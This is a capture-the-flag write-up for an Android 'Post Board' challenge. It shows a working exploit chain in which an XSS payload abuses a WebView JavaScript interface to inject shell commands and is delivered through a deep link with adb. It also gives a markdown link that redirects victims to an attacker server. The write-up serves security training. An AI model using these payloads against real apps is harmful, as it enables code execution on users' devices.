# Writeup for Post Board challenge.

>here's how to use the scripts only as proof of concept.
Check the full Writeup at my blog --> [Post Board](https://blog.parad0x.vip/blog/2024/10/01/PostBoard1.html)
---

## Objective
This challenge is designed to delve into the complexities of Android's WebView component, exploiting a Cross-Site Scripting (XSS) vulnerability to achieve Remote Code Execution (RCE). It's a great opportunity to engage with Android application security focusing on WebView security issues.

## RCE
To achieve the RCE first we need to create a payload
using the XSS vulnerability and encode in base64.

```sh
echo "<img src=\"x\" \
onerror=\"WebAppInterface.postCowsayMessage('Moooo;whoami;pwd;date') \
\">"|base64
```

Then send it through the deep link.

```sh
adb shell am start -a android.intent.action.VIEW \ 
-n com.mobilehackinglab.postboard/.MainActivity -d \ 
"postboard://postmessage/PGltZyBzcmM9IngiIG9uZXJyb3I9IldlYkFwcEludGVyZmFjZS5wb3N0Q293c2F5TWVzc2FnZSgnTW9vb287d2hvYW1pO3B3ZDtkYXRlJykgIj4K"
```


## Bonus XSS on Chrome Client 
Sending a malicious link to the application it's possible to redirect the victim to my evil website. The app will convert my markdown in a clickable link then my evil website will load.

Payload: `[Innocent Link](http://{YOUR_SERVER_IP:PORT}/)` 

## Video

<div style="padding:51.56% 0 0 0;position:relative;"><iframe src="https://player.vimeo.com/video/1011473045?badge=0&amp;autopause=0&amp;player_id=0&amp;app_id=58479" frameborder="0" allow="autoplay; fullscreen; picture-in-picture; clipboard-write" style="position:absolute;top:0;left:0;width:100%;height:100%;" title="postboard"></iframe></div><script src="https://player.vimeo.com/api/player.js"></script>

## Conclusion

On my blog, I'll cover step by step to achieve the RCE and exploit the XSS weakness.
